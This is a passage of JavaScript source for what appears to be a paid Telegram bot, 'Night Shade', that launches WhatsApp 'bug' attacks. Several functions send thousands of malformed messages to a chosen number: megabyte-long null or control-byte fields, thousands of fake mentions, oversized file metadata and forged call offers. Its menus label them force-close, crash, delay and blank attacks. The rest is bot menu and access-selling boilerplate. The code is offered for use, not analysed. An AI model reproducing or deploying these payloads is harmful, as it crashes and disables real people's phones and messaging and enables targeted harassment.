    } catch (error) {
        console.error(chalk.red(`❌ Luldel KESALAHAN FATALE: ${error.message}`));
        return { success: false, error: error.message };
    }
}

async function ZhTxHxHgsGlx(sock, jid) {
  for (let i = 0; i < 50; i++) {
    let ZhTxRizzMsg = generateWAMessageFromContent(jid, {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length: 2000 }, (_, r) => `6285983729${r + 1}@s.whatsapp.net`)
        },
        body: {
          text: "Xst | Rayy - Ex3cutor",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
          version: 3
        }
      }
    }, {});
    
    await sock.relayMessage(
      jid,
      {
        groupStatusMessageV2: {
          message: ZhTxRizzMsg.message
        }
      },
      jid
        ? { messageId: ZhTxRizzMsg.key.id, participant: { jid: jid } }
        : { messageId: ZhTxRizzMsg.key.id }
    );
  }
    console.log(chalk.red(`Succes Sending Bug By Rayy To ${target}`));
}

async function DelayHard(sock, jid) {
  for (let i = 0; i < 1000; i++) {
    await sock.relayMessage(jid, {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                fileName: "CsmX.zip",
                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1726867151",
                contactVcard: true,
                jpegThumbnail: ""
              },
              hasMediaAttachment: true
            },
            body: {
              text: "-\n" + 'ꦽ'.repeat(1000) + "@13135550202".repeat(15000)
            },
            nativeFlowMessage: {},
            contextInfo: {
              mentionedJid: ["13135550202@s.whatsapp.net", ...Array.from({
                length: 2000
              }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
              forwardingScore: 1,
              isForwarded: true,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                  fileName: "CsmX.doc",
                  fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                  directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1724474503",
                  contactVcard: true,
                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: ""
                }
              }
            }
          }
        }
      },
    }, {
      messageId: null,
      participant: { jid: jid }
    });
  }
  await new Promise((r) => setTimeout(r, 1500));
  await sock.relayMessage(jid, {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 1316134911,
              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
              fileName: "CosmoX.zip",
              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1726867151",
              contactVcard: true,
              jpegThumbnail: ""
            },
            hasMediaAttachment: true
          },
          body: {
            text: "-\n" + 'ꦽ'.repeat(1000) + "@13135550202".repeat(15000)
          },
          nativeFlowMessage: {},
          contextInfo: {
            mentionedJid: ["13135550202@s.whatsapp.net", ...Array.from({
              length: 2000
            }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
            forwardingScore: 1,
            isForwarded: true,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                fileName: "CsmX.doc",
                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1724474503",
                contactVcard: true,
                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                jpegThumbnail: ""
              }
            }
          }
        }
      }
    },
  }, {
    messageId: null,
    participant: { jid: jid }
  });

  for (let i = 0; i < 1000; i++) {
    const msg = await generateWAMessageFromContent(jid, {
      viewOnceMessagw: {
        message: {
          messageContextInfo: {
            deviceListMetada: {},
            deviceListMetadaVersion: 2
          },
          interactiveResponseMessage: {
            body: {
              text: "x",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\x10".repeat(1045000),
              version: 3
            },
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 1999 }, () => 1 + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                )
              ],
              fromMe: false,
              participant: jid,
              forwardingScore: 9999,
              isForwarded: true,
              entryPointConversionSource: "address_message",
            }
          }
        }
      }
    }, {});

    await sock.relayMessage(jid, {
      groupStatusMessageV2: {
       message: msg.message
      }
    }, {
      messageId: msg.key.id,
      participant: { jid: jid }
    });
    await new Promise((r) => setTimeout(r, 1000));
  }

  var msg = generateWAMessageFromContent(jid, {
    "videoMessage": {
      "url": "https://mmg.whatsapp.net/v/t62.7161-24/637975398_2002009003691900_8040701886006703825_n.enc?ccb=11-4&oh=01_Q5Aa3wG-6_BGPGfHNfyrcMFV71OBMz1Wotj66ClQWgKoRxmtfA&oe=69BFA77E&_nc_sid=5e03e0&mms3=true",
      "mimetype": "video/mp4",
      "fileSha256": "CleMtlrI+21HNQ298bFL4MaF6k9hJImlKgK7WAT/g+Y=",
      "fileLength": "231536",
      "seconds": 88888888,
      "mediaKey": "WlFBzxOj7hIziHuhR8gNCKE2YZSXgcLnfoydMn32FQI=",
      "caption": "x",
      "height": -99999,
      "width": 99999,
      "fileEncSha256": "zTpAsUWfVLGid5PNcL6/39JVADbLUUK0PT2cxlGpsDA=",
      "directPath": "/v/t62.7161-24/637975398_2002009003691900_8040701886006703825_n.enc?ccb=11-4&oh=01_Q5Aa3wG-6_BGPGfHNfyrcMFV71OBMz1Wotj66ClQWgKoRxmtfA&oe=69BFA77E&_nc_sid=5e03e0",
      "mediaKeyTimestamp": "1771576607",
      "contextInfo": {
        "pairedMediaType": "NOT_PAIRED_MEDIA",
        "statusSourceType": "VIDEO",
        "remoteJid": " #xrellyspec ",
        "mentionedJid": Array.from({ length: 2000 }, (_, z) => `628${z + 1}@s.whatsapp.net`),
        "businessMessageForwardInfo": {
          "businessOwnerJid": "13135550202@s.whatsapp.net",
          "businessDescription": null
        },
        "featureEligibilities": {
          "canBeReshared": true
        },
        "isForwarded": true,
        "forwardingScore": 9999,
        "statusAttributions": [
          {
            "type": "MUSIC",
            "externalShare": {
              "actionUrl": "https://wa.me/settings/linked_devices#,,xrellyspec",
              "source": "INSTAGRAM",
              "duration": 999999999,
              "actionFallbackUrl": "https://wa.me/settings/linked_devices#,,xrellyspec"
            }
          }
        ]
      },
      "streamingSidecar": "xUQqEMh4oVoqMy9qDBB3gaNI3yZbbX7dtli6KJ6N1ijvk09oVJzI8w==",
      "thumbnailDirectPath": "/v/t62.36147-24/640522275_2376887426118122_4696194772404190783_n.enc?ccb=11-4&oh=01_Q5Aa3wHXgSUEMms1n1PJZN7I8Ip8kaEzKYH5nfr9X62LJNv1bw&oe=69BF74C1&_nc_sid=5e03e0",
      "thumbnailSha256": "9kdKXkxHeCZxJ7WwQ00xanJD9CRLfgrs4lxLd/cRBXQ=",
      "thumbnailEncSha256": "DuH7/OR2Jz+SPxDiNyl2wKdUDbr6upAQtCmjwAS22CA=",
      "annotations": [
        {
          "shouldSkipConfirmation": true,
          "embeddedContent": {
            "embeddedMessage": {
              "stanzaId": "ACFC34B6742717BAC2BFE825254E1CD1",
              "message": {
                "extendedTextMessage": {
                  "text": "$",
                  "previewType": "NONE",
                  "inviteLinkGroupTypeV2": "DEFAULT"
                },
                "messageContextInfo": {
                  "messageSecret": "1y9Zx4kWsv7YLUdsLvUAvSSxlE6KVPSyllLwgXkSzfg=",
                  "messageAssociation": {
                    "associationType": 18,
                    "parentMessageKey": {
                      "remoteJid": "status@broadcast",
                      "fromMe": false,
                      "id": "ACEEC73D18B6805DBC04CC8ADF65BF6D",
                      "participant": "13135550202@s.whatsapp.net"
                    }
                  }
                }
              }
            }
          },
          "embeddedAction": true
        }
      ],
      "externalShareFullVideoDurationInSeconds": 8
    }
  }, {})

    let kel = generateWAMessageFromContent(
      jid,
      {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              contextInfo: {
                remoteJid: " x ",
                mentionedJid: ["13135559098@s.whatsapp.net"],
              },
              body: {
                text: "fuck u",
                format: "DEFAULT",
              },
              nativeFlowResponseMessage: {
                name: "address_message",
                paramsJson: `{"values":{"in_pin_code":"7205","building_name":"russian motel","address":"2.7205","tower_number":"507","city":"Batavia","name":"dvx","phone_number":"+13135550202","house_number":"7205826","floor_number":"16","state":"${"\x10".repeat(1000000)}"}}`,
                version: 3,
              },
            },
          },
        },
      },
      {
        participant: { jid: jid },
      },
    );

    await sock.relayMessage('status@broadcast', msg.message, {
      statusJidList: [jid]
    });

    await sock.relayMessage('status@broadcast', kel.message, {
      statusJidList: [jid]
    });
}

// ~ ( CRASH CLICK NO INVIS ) ~ \\

async function ZhTForceCloseNew(sock, jid) {
    let ZhTxRizzMsg = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [jid],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: jid,
              },
            },
            body: {
              text: "H3LL0",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "𑜦𑜠".repeat(10000),
                  id: null
                })
               }
              ]
            }
          }
        }
      }
    }
    await sock.relayMessage(jid, ZhTxRizzMsg, {
      messageId: null,
      participant: { jid: jid },
      userJid: jid,
    });
}

// ~ ( BLANK CLICK ) ~ \\

async function systemui(sock, jid) {
  try {
    const msg = await generateWAMessageFromContent(
      jid,
      {
        viewOnceMessage: {
          message: {
            extendedTextMessage: {
              text: "System Ui" + "ꦽ".repeat(25000),
              contextInfo: {
                participant: jid,
                remoteJid: "0@s.whatsapp.net",
                mentionedJid: [jid]
              }
            }
          }
        }
      },
      {}
    );
    
    await sock.relayMessage(jid, msg.message, {
      messageId: msg.key.id,
      participant: { jid: jid }
    });
  } catch (err) {
    console.error("Error:", err);
  }
}

async function superpowers(sock, jid) {
  const paylod = {
    viewOnceMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            title: "#",
            hasMediaAttachment: false
          },
          body: {
            text: "ꦾ".repeat(60000) + "ោ៝".repeat(20000)
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: ""
              },
              {
                name: "cta_call",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(5000)
                })
              },
              {
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(5000)
                })
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(5000)
                })
              }
            ],
            messageParamsJson: "[{".repeat(10000)
          }
        }
      }
    }
  };

  const msg2 = {
    newsletterAdminInviteMessage: {
      newsletterJid: "120363321780343299@newsletter",
      newsletterName: "#".repeat(5000),
      caption: "ꦽ".repeat(5000),
      inviteExpiration: "909092899"
    }
  };

  const msg3 = {
    newsletterAdminInviteMessage: {
      newsletterJid: "120363407468452340@newsletter",
      newsletterName: "🍷⃟༑⌁⃰Three Brothers🦠" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
      caption: "🍷⃟༑⌁⃰Three Broters🦠" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
      inviteExpiration: "999999999"
    }
  };
  await sock.relayMessage(jid, paylod, {
    messageId: null,
    participant: { jid: jid }
  });
  await sock.relayMessage(jid, msg2, {
    messageId: null,
    participant: { jid: jid }
  });
  await sock.relayMessage(jid, msg3, {
    participant: { jid: jid },
    messageId: null
  });

  console.log("Sending Blank");
}

// ~ ( FORCLOSE INVIS BEBAS SPAM ) ~ \\

async function MakLoInpis(sock, jid) {
    const {
        encodeSignedDeviceIdentity,
        jidEncode,
        jidDecode,
        encodeWAMessage,
        patchMessageBeforeSending,
        encodeNewsletterMessage
    } = require("xatabail");
    const crypto = require("crypto");
    let devices = (
        await sock.getUSyncDevices([jid], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

    await sock.assertSessions(devices);

    let node1 = () => {
        let map = {};
        return {
            mutex(key, fn) {
                map[key] ??= { task: Promise.resolve() };
                map[key].task = (async prev => {
                    try { await prev; } catch {}
                    return fn();
                })(map[key].task);
                return map[key].task;
            }
        };
    };

    let node2 = node1();
    let node3 = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    let node4 = sock.createParticipantNodes.bind(sock);
    let node5 = sock.encodeWAMessage?.bind(sock);

    sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
        if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

        let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);

        let ywdh = Array.isArray(patched)
            ? patched
            : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

        let { id: meId, lid: meLid } = sock.authState.creds.me;
        let omak = meLid ? jidDecode(meLid)?.user : null;
        let shouldIncludeDeviceIdentity = false;

        let nodes = await Promise.all(
            ywdh.map(async ({ recipientJid: jid, message: msg }) => {
                let { user: targetUser } = jidDecode(jid);
                let { user: ownPnUser } = jidDecode(meId);

                let isOwnUser = targetUser === ownPnUser || targetUser === omak;
                let y = jid === meId || jid === meLid;

                if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

                let bytes = node3(
                    node5 ? node5(msg) : encodeWAMessage(msg)
                );

                return node2.mutex(jid, async () => {
                    let { type, ciphertext } = await sock.signalRepository.encryptMessage({
                        jid,
                        data: bytes
                    });

                    if (type === "pkmsg") shouldIncludeDeviceIdentity = true;

                    return {
                        tag: "to",
                        attrs: { jid },
                        content: [{
                            tag: "enc",
                            attrs: { v: "2", type, ...extraAttrs },
                            content: ciphertext
                        }]
                    };
                });
            })
        );

        return {
            nodes: nodes.filter(Boolean),
            shouldIncludeDeviceIdentity
        };
    };
    const startTime = Date.now();
    const duration = 10 * 60 * 50000;
    while (Date.now() - startTime < duration) {
        for (let i = 0; i < 100; i++) {
            let awik = crypto.randomBytes(32);
            let awok = Buffer.concat([awik, Buffer.alloc(8, 0x01)]);

            let {
                nodes: destinations,
                shouldIncludeDeviceIdentity
            } = await sock.createParticipantNodes(
                devices,
                { conversation: "y" },
                { count: "0" }
            );

            let lemiting = {
                tag: "call",
                attrs: {
                    to: jid,
                    id: sock.generateMessageTag(),
                    from: sock.user.id
                },
                content: [{
                    tag: "offer",
                    attrs: {
                        "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
                        "call-creator": sock.user.id
                    },
                    content: [
                        { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                        { tag: "audio", attrs: { enc: "opus", rate: "8000" } },

                        {
                            tag: "video",
                            attrs: {
                                orientation: "0",
                                screen_width: "1920",
                                screen_height: "1080",
                                device_orientation: "0",
                                enc: "vp8",
                                dec: "vp8"
                            }
                        },

                        { tag: "net", attrs: { medium: "3" } },

                        {
                            tag: "capability",
                            attrs: { ver: "1" },
                            content: new Uint8Array([1, 5, 247, 9, 228, 250, 1])
                        },

                        { tag: "encopt", attrs: { keygen: "2" } },

                        { tag: "destination", attrs: {}, content: destinations },

                        ...(shouldIncludeDeviceIdentity ? [{
                            tag: "device-identity",
                            attrs: {},
                            content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
                        }] : [])
                    ]
                }]
            };

            await sock.sendNode(lemiting);
            await new Promise(resolve => setTimeout(resolve, 500)); 
        }

        try {
            await sock.chatModify({ clear: true }, jid);
            console.log("SUCCES");
        } catch (error) {
            console.error("GAGAL:", error);
        }
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
    console.log(chalk.red("Succesfully Send Forclose New"));  
}

//====================END FUNCTION BUG LU==============================\\
function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}
async function sleep(ms) {
  await new Promise(resolve => setTimeout(resolve, ms));
}


const bugRequests = {};
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";
  const premiumStatus = getPremiumStatus(senderId);  // Mengambil status premium langsung
  const runtime = getBotRuntime();
  const randomImage = getRandomImage();
  
  if (shouldIgnoreMessage(msg)) return;

  // Tidak lagi memeriksa status premium, langsung ke video
  bot.sendPhoto(chatId, "https://ibb.co.com/bMFJgwG6", {
    caption: `\`\`\`javascript
╔═════✦༻💀༺✦═══════╗
      𝐖𝐄𝐋𝐂𝐎𝐌𝐄 — 𝐔𝐒𝐄𝐑𝐒
╚═════✦༻💀༺✦═══════╝

System : Buy Access Activated
Database : Successfully Synced
━━━━━━━━━━━━━━━━━━━━
      INFORMATION
━━━━━━━━━━━━━━━━━━━━
Name : Night Shade
Version : 12.0.0 Auto Update
Developer : @joyyyclod
━━━━━━━━━━━━━━━━━━━━

ؕوَلَا يَحِيۡقُ الۡمَكۡرُ السَّيِّـئُ اِلَّا بِاَهۡلِهٖ
"Rencana yang jahat tidak akan menimpa selain orang yang merencanakannya sendiri."\`\`\``,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "Trash Menu", 
            callback_data: "trashmenu", 
            style: 'Success',
            icon_custom_emoji_id: '5283069434917836059' },
          { text: "Trash Bebas Spam", 
            callback_data: "trashmenu2", 
            style: 'Success',
            icon_custom_emoji_id: '5283069434917836059' }
        ],
        [
          { text: "Owner Menu", 
            callback_data: "setting", 
            style: 'Danger',
            icon_custom_emoji_id: '5474209240665041113' },
          { text: "TqTo", 
            callback_data: "tqto", 
            style: 'Danger',
            icon_custom_emoji_id: '5999265900224584419' },
          { text: "Group Menu", 
            callback_data: "group", 
            style: 'Danger',
            icon_custom_emoji_id: '5258513401784573443' }
        ],
        [
          { text: "Channel", 
            url: "https://t.me/testimonijoyycloud", 
            style: 'Primary',
            icon_custom_emoji_id: '5839406384243807787' },
          { text: "Developer", 
            url: "https://t.me/joyyyclod", 
            style: 'Primary',
            icon_custom_emoji_id: '5217822164362739968' }
        ],
        [
           { text: "Harga Join Title Night Shade", 
             callback_data: "hargajoin", 
             style: 'Danger',
             icon_custom_emoji_id: '5958532907130689334' }
        ]
      ]
     }
 });
    const audioPath = path.join(__dirname, "./lib/Joyyy.mp3");
  bot.sendAudio(chatId, audioPath, {
    caption: `Night. ☇ - Shade`,
    perfomer: `
Paduka. - Joyy`,
  });
});

bot.on("callback_query", async (query) => {
  try {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const username = query.from.username ? `@${query.from.username}` : "Tidak ada username";
    const senderId = query.from.id;
    const runtime = getBotRuntime();
    const premiumStatus = getPremiumStatus(query.from.id);
    const randomImage = getRandomImage();

    let caption = "";
    let replyMarkup = {};

    if (query.data === "trashmenu") {
      caption = `\`\`\`javascript
━━━━━━━━━━━━━━━━━━━━
System : Buy Access Activated
Database : Successfully Synced
━━━━━━━━━━━━━━━━━━━━
━━━━━━━━━━━━━━━━━━━━
      INFORMATION
━━━━━━━━━━━━━━━━━━━━
Name : Night Shade
Version : 12.0.0 Auto Update
Developer : @joyyyclod
━━━━━━━━━━━━━━━━━━━━

ؕوَلَا يَحِيۡقُ الۡمَكۡرُ السَّيِّـئُ اِلَّا بِاَهۡلِهٖ
"Rencana yang jahat tidak akan menimpa selain orang yang merencanakannya sendiri."
┏━⪼「 ʙᴜɢ ᴍᴇɴᴜ 」
┃𖥂 /hyper
┃    ╰➤ ꜰᴏʀᴄʟᴏꜱᴇ ᴄᴀʟʟ
┃𖥂 /victrus
┃    ╰➤ ᴅᴇʟᴀʏ ʜᴀʀᴅ ɪɴᴠɪꜱɪʙʟᴇ
┃𖥂 /spirtus
┃    ╰➤ ᴄʀᴀꜱʜ ᴄʟɪᴄᴋ ɴᴏ ɪɴᴠɪꜱ
┃𖥂 /avail
┃    ╰➤ ʙʟᴀɴᴋ ᴄʟɪᴄᴋ
┗━━━━━━━━━━━━━━⪼\`\`\``;
// DI ATAS ISI LIST MENU ELU
      replyMarkup = { inline_keyboard: [[{ text: "Back", callback_data: "back_to_main" }]] };
  }
  
    if (query.data === "trashmenu2") {
      caption = `\`\`\`javascript
━━━━━━━━━━━━━━━━━━━━
System : Buy Access Activated
Database : Successfully Synced
━━━━━━━━━━━━━━━━━━━━
━━━━━━━━━━━━━━━━━━━━
      INFORMATION
━━━━━━━━━━━━━━━━━━━━
Name : Night Shade
Version : 12.0.0 Auto Update
Developer : @joyyyclod
━━━━━━━━━━━━━━━━━━━━

ؕوَلَا يَحِيۡقُ الۡمَكۡرُ السَّيِّـئُ اِلَّا بِاَهۡلِهٖ
"Rencana yang jahat tidak akan menimpa selain orang yang merencanakannya sendiri."
┏━⪼「 ʙᴜɢ ᴍᴇɴᴜ 2 」
┃𖥂 /abyss
┃    ╰➤ ꜰᴏʀᴄʟᴏꜱᴇ ɪɴᴠɪꜱɪʙʟᴇ ʙᴇʙᴀꜱ ꜱᴘᴀᴍ
┗━━━━━━━━━━━━━━⪼\`\`\``;
// DI ATAS ISI LIST MENU ELU
      replyMarkup = { inline_keyboard: [[{ text: "Back", callback_data: "back_to_main" }]] };
  }
    
    if (query.data === "setting") {
      caption = `\`\`\`javascript
━━━━━━━━━━━━━━━━━━━━
System : Buy Access Activated
Database : Successfully Synced
━━━━━━━━━━━━━━━━━━━━
━━━━━━━━━━━━━━━━━━━━
      INFORMATION 
━━━━━━━━━━━━━━━━━━━━
Name : Night Shade
Version : 12.0.0 Auto Update
Developer : @joyyyclod
━━━━━━━━━━━━━━━━━━━━

ؕوَلَا يَحِيۡقُ الۡمَكۡرُ السَّيِّـئُ اِلَّا بِاَهۡلِهٖ
"Rencana yang jahat tidak akan menimpa selain orang yang merencanakannya sendiri."
┏━⪼「 ᴍᴇɴᴜ ᴀᴋsᴇs 」
┃𖥂 /setjeda - 5m
┃𖥂 /addprem - id
┃𖥂 /delprem - id
┃𖥂 /listprem
┃𖥂 /addadmin - id
┃𖥂 /deladmin - id
┃𖥂 /delsesi
┃𖥂 /restart
┃𖥂 /addsender - 62×××
┃𖥂 /update
┗━━━━━━━━━━━━━━⪼\`\`\``;
      replyMarkup = { inline_keyboard: [[{ text: "Back", callback_data: "back_to_main" }]] };
  }
       if (query.data === "tqto") {
      caption = `\`\`\`javascript
━━━━━━━━━━━━━━━━━━━━
System : Buy Access Activated
Database : Successfully Synced
━━━━━━━━━━━━━━━━━━━━
━━━━━━━━━━━━━━━━━━━━
      INFORMATION
━━━━━━━━━━━━━━━━━━━━
Name : Night Shade
Version : 12.0.0 Auto Update
Developer : @joyyyclod
━━━━━━━━━━━━━━━━━━━━

ؕوَلَا يَحِيۡقُ الۡمَكۡرُ السَّيِّـئُ اِلَّا بِاَهۡلِهٖ
"Rencana yang jahat tidak akan menimpa selain orang yang merencanakannya sendiri."
┏━⪨「 ᴛʜᴀɴᴋs ᴛᴏᴏ 」
┃𖥂 @joyyyclod [ ᴅᴇᴠᴇʟᴏᴘᴇʀ ]
┃𖥂 @ApongSakata [ ꜰʀɪᴇɴᴅ ]
┃𖥂 @farelllgls [ ᴘᴀʀᴛɴᴇʀ ᴘʀɪʙ ]
┃𖥂 @zyvyonc [ ᴘᴀʀᴛɴᴇʀ ᴘʀɪʙ ]
┃𖥂 ᴍʏ ɢᴏᴅ [ ᴀʟʟᴀʜ ]
┃𖥂 ᴍʏ ᴘᴀʀᴇɴᴛ [ ᴅᴀᴅ & ᴍᴏᴍ ]
┗━━━━━━━━━━━━━━▣\`\`\``;
      replyMarkup = { inline_keyboard: [[{ text: "Back", callback_data: "back_to_main" }]] };
  }
          if (query.data === "group") {
      caption = `\`\`\`javascript
━━━━━━━━━━━━━━━━━━━━
System : Buy Access Activated
Database : Successfully Synced
━━━━━━━━━━━━━━━━━━━━
      INFORMATION
━━━━━━━━━━━━━━━━━━━━
Name : Night Shade
Version : 12.0.0 Auto Update
Developer : @joyyyclod
━━━━━━━━━━━━━━━━━━━━

ؕوَلَا يَحِيۡقُ الۡمَكۡرُ السَّيِّـئُ اِلَّا بِاَهۡلِهٖ
"Rencana yang jahat tidak akan menimpa selain orang yang merencanakannya sendiri.
┏━⪼「 ɢʀᴏᴜᴘ ᴍᴇɴᴜ 」
┃𖥂 /demote (ʀᴇᴘʟʏ)
┃𖥂 /promote (ʀᴇᴘʟʏ)
┃𖥂 /open
┃𖥂 /close
┃𖥂 /X (ʀᴇᴘʟʏ)
┃𖥂 /mute (ʀᴇᴘʟʏ)
┃𖥂 /unmute (ʀᴇᴘʟʏ)
┃𖥂 /groupAktip
┃𖥂 /groupNonaktif
┃𖥂 /addgroup
┃𖥂 /delgroup
┃𖥂 /listgroup
┃𖥂 /add (@username)
┃𖥂 /setwelcome (ᴛᴇxᴛ)
┃𖥂 /setwelcome (ᴛᴇxᴛ)
┃𖥂 /antilink (ᴏɴ/ᴏғғ)
┃𖥂 /info
┃𖥂 /tourl (ʀᴇᴘʟʏ)
┗━━━━━━━━━━━━━━⪼\`\`\``;
      replyMarkup = { inline_keyboard: [[{ text: "Back", callback_data: "back_to_main" }]] };
  }
  
    if (query.data === "hargajoin") {
      caption = `\`\`\`javascript
━━━━━━━━━━━━━━━━━━━━
System : Buy Access Activated
Database : Successfully Synced
━━━━━━━━━━━━━━━━━━━━
━━━━━━━━━━━━━━━━━━━━
      INFORMATION
━━━━━━━━━━━━━━━━━━━━
Name : Night Shade
Version : 12.0.0 Auto Update
Developer : @joyyyclod
